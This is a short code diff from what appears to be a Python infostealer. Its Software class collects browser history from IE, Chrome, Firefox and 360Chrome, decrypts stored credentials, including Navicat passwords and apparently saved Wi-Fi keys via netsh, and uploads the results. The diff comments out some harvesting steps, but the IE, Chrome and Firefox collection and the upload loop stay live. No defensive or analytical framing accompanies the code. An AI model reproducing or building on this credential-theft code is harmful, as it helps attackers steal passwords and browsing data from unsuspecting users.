@@ -100,7 +100,7 @@ class Software:
         print '[*] Finding histroy in ie'
         self.get_ie_history()
         output.ie_decrypt()
-        output.decrypt_using_netsh()
+        # output.decrypt_using_netsh()
         if re.findall("Google+", Installation, re.S):
             print '[*] Finding histroy in Chrome'
             self.get_chrome_history()
@@ -113,12 +113,12 @@ class Software:
             output.send_firefox_data()
         else:
             pass
-        print '[*] Finding histroy in 360Chrome'
-        self.get_360c_history()
-        output.get_decypt_360chrome()
+        # print '[*] Finding histroy in 360Chrome'
+        # self.get_360c_history()
+        # output.get_decypt_360chrome()
         if re.findall('Navicat+', Installation, re.S):
             print "[*] Attempting to decrypt Navicat"
-            upload().navicatpwd()
+            # upload().navicatpwd()
         print_warning("Please wait while uploading ... ")
         log_tmp = list(set(command_list))
         for history in log_tmp:
